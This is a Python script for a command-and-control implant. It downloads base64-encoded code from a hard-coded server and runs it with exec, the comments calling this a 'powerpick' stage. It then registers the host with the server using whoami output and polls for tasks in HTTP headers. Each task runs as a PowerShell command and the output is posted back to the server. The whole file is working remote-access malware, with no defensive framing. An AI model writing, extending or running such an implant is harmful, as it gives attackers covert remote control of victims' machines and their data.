import requests
import subprocess
import time
from sys import exit
from base64 import b64decode

global target
target = "10.109.185.88:8000"

# importing powerpick, I'm trying to stage as much as I code
data = requests.get(f"http://{target}/tranfer").text
code = b64decode(data).decode()
exec(code) 

# create a small banner and register against C2
def login():
    myname = "whoami.exe"
    banner = subprocess.run([myname], stdout=subprocess.PIPE)
    guid = banner.stdout.decode().strip()
    requests.get(f"http://{target}/login?new={guid}")

def connect():
    sleep_time = 2
    while True:
        time.sleep(sleep_time)
        command, sleeping = check_task()
        if sleeping:
            sleep_time = int(sleeping)
        elif command:
            data = execute_powershell(command) # we actually have this function, it has been downloaded in the initial stage
            message = {"command":command, "output": data}
            requests.post(f"http://{target}/results", json=message)

def check_task():
    try:
        r = requests.get(f"http://{target}/check", timeout=5)
        sleep = r.headers.get("X-Connection-Close")
        command = r.headers.get("X-Tasks")
        return command, sleep
    except requests.exceptions.Timeout:
        print("The request timed out")
        exit(1)
        return

def main():
    login()
    connect()

if __name__ == "__main__":
    main()